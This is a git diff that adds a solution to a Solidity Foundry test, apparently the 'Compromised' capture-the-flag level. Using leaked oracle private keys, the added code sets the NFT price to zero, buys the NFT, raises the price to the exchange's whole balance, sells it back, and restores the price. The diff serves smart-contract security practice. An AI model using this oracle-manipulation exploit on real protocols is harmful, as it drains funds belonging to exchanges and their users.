@@ -81,6 +81,36 @@ contract Compromised is DSTest {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // The leaked website data corresponds to 2 private keys of the oracle
+        // trusted sources 0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and
+        // 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+        // With the knowledge of those private key I can simply set nft price
+        // in the oracle to 0, "buy" the nft then hike the price to exchange
+        // balance and "sell" the nft back
+
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(sources[2]);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+        vm.prank(sources[2]);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.startPrank(attacker);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sources[2]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         /** EXPLOIT END **/
         validation();
     }
